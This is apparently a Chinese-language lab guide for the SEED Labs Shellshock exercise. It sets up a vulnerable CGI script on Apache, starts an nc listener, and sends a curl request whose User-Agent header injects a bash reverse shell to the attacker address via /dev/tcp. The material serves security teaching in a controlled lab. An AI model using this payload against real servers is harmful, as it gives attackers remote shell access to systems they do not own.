## 利用Shellshock攻击CGI程序

（本实验以通过攻击创建反向shell为例，提供Windows下的curl和nc程序）

### 1. 配置环境

（网络环境）假设攻击者A（Windows宿主机）的IP为IPA，服务器B（SeedLab虚拟机）的IP为IPB，配置网络环境使得两者可以互相ping通。

+ Windows关闭防火墙
+ 通过ifconfig、ipconfig查看IP地址，宿主机可能包括多个网卡和IP4，使用与虚拟机同一网段的IP地址。

（启动Web服务）在服务器上：sudo service apache2 start

（创建test.cgi文件）sudo vim /usr/lib/cgi-bin/test.cgi
```bash
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo
echo
echo "Hello World"
```
这时 curl http://IPB/cgi-bin/test.cgi 应该可以看到Hello World。

### 2. 攻击者创建监听

```bash
nc.exe -lv -p 9090
```

### 3. 发起攻击

```bash
curl.exe -A "() { echo hello;}; echo Content_type: text/plain; echo; echo; /bin/bash -i > /dev/tcp/IPA/9090 0<&1 2>&1" http://IPB/cgi-bin/test.cgi
```
这时可以获得一个服务器的shell。